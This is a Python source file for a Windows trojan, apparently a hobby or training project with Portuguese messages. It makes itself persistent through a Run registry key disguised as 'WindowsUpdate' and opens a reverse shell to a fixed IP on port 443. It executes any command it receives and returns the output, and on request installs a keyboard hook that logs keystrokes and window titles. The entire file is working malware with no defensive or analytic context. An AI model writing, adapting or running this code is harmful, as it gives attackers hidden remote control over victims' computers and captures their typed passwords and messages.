import socket
import time
import subprocess
import tempfile
import os
import shutil
import pyHook
import pythoncom


IP = '192.168.0.104'
PORT = 443
FILENAME = 'python_horse.py'
TEMPDIR = tempfile.gettempdir()
DIRETORIO = os.path.dirname(os.path.abspath(__file__))
janela = None


def autorun():
    try:
        shutil.copy(FILENAME, TEMPDIR)
    except:
        print('Erro na copia')
        pass

    try:
        FNULL = open(os.devnull, 'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                         " /v WindowsUpdate /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
    except:
        print('Erro no registro')
        pass

def connect(IP, PORT):

    try:
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp.connect((IP, PORT))
        tcp.send('[!]Conexao recebida\n')
        return tcp
    except Exception as e:
        #print 'Erro de conexao:', e
        return None
def listen(tcp):
    try:
        while True:
            data = tcp.recv(1024)
            if data[:-1] == '/exit':
                tcp.close()
                exit(0)
            elif data[:-1] == '/keylogger':
                def tecla_pressionada(evento):
                    arquivo = open('log.txt', 'a')
                    global janela
                    if evento.WindowName != janela:
                        janela = evento.WindowName
                        arquivo.write('\n' + janela + ' - ' + str(evento.Time) + '\n')
                    arquivo.write(chr(evento.Ascii))
                    arquivo.close()
                    return True
                hook = pyHook.HookManager()
                hook.KeyDown = tecla_pressionada
                hook.HookKeyboard()
                pythoncom.PumpMessages()

                #file_name = 'log.txt'
                #file = open(file_name)
                #file_data = file.read()
                #while True:
                    #tcp.send(file_data)
                    #file.close()

            else:
                cmd(tcp, data[:-1])
    except:
        #print 'Erro no listen'
        error(tcp)

def cmd(tcp, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        saida = proc.stdout.read() + proc.stderr.read()
        tcp.send(saida+'\n')
    except:
        #print 'Erro no cmd'
        error(tcp)

def error(tcp):
    if tcp:
        tcp.close()
    main()

def main():
    while True:
        tcp_conectado = connect(IP, PORT)
        if tcp_conectado:
            listen(tcp_conectado)
        else:
            print('Conexao deu erro, tentando novamente')
            time.sleep(10)


if DIRETORIO.lower() != TEMPDIR:
    autorun()
main()